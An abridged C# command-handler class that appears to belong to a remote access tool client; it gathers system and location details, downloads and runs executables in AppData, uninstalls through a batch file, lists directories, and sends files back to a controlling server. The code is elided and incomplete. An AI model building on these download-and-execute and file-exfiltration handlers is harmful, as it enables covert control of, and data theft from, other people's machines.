...
namespace Core.Commands
{
    public class CommandHandler
    {
        ...
        public static void HandleInitializeCommand(Core.Packets.ServerPackets.InitializeCommand command,
            Core.Client client)
        {
            SystemCore.InitializeGeoIp();
            new Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem,
                SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City,
                SystemCore.ImageIndex).Execute(client);
        }

        public static void HandleDownloadAndExecuteCommand(Core.Packets.ServerPackets.DownloadAndExecute command,
            Core.Client client)
        {
            ...
            new Thread(new ThreadStart(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.GetRandomFilename(12, ".exe"));
        ...
        public static void HandleUninstall(Core.Packets.ServerPackets.Uninstall command, Core.Client client)
        {
            ...
            string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Helper.GetRandomFilename(12, ".bat"));
        ...
        public static void HandleDirectory(Core.Packets.ServerPackets.Directory command, Core.Client client)
        {
            ...
            {
                new Core.Packets.ClientPackets.DirectoryResponse(new string[] {"$$$EMPTY$$$$"},
                    new string[] {"$$$EMPTY$$$$"}, new long[] {0}).Execute(client);
            }
        }
        ...
        public static void HandleDownloadFile(Core.Packets.ServerPackets.DownloadFile command, Core.Client client)
        {
            try
            {
                ...
                new Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes,
                    command.ID).Execute(client);
            }
            catch
            {
            }
